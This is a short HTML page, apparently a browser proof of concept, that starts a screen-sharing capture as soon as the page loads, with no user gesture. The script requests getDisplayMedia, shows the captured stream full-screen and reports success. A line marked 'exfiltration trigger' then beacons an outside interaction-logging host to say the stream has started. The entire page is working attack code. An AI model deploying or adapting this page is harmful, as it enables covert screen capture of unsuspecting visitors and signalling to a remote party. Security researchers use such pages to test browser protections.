<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Screen Access</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <style>
    html, body {
      margin: 0;
      background: #111;
      color: white;
      font-family: -apple-system, sans-serif;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      flex-direction: column;
    }

    #status {
      margin-top: 20px;
      font-size: 14px;
      color: #aaa;
    }
  </style>
</head>
<body>

<h2>Preparing screen sharing session…</h2>
<p id="status">Waiting for permissions...</p>

<script>
  window.onload = async () => {
    try {
      const stream = await navigator.mediaDevices.getDisplayMedia({ video: true });

      const video = document.createElement("video");
      video.srcObject = stream;
      video.autoplay = true;
      video.style = "position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:1000;";
      document.body.appendChild(video);

      document.getElementById("status").textContent = "✅ Screen stream started (no gesture).";

      // Optional: exfiltration trigger
      navigator.sendBeacon("https://jqdfjiuzmdhhkipzoaxxf2ocrw07i3cw7.oast.fun", "stream started");

    } catch (err) {
      document.getElementById("status").textContent = "❌ Access denied or blocked.";
      console.error("Error:", err);
    }
  };
</script>

</body>
</html>
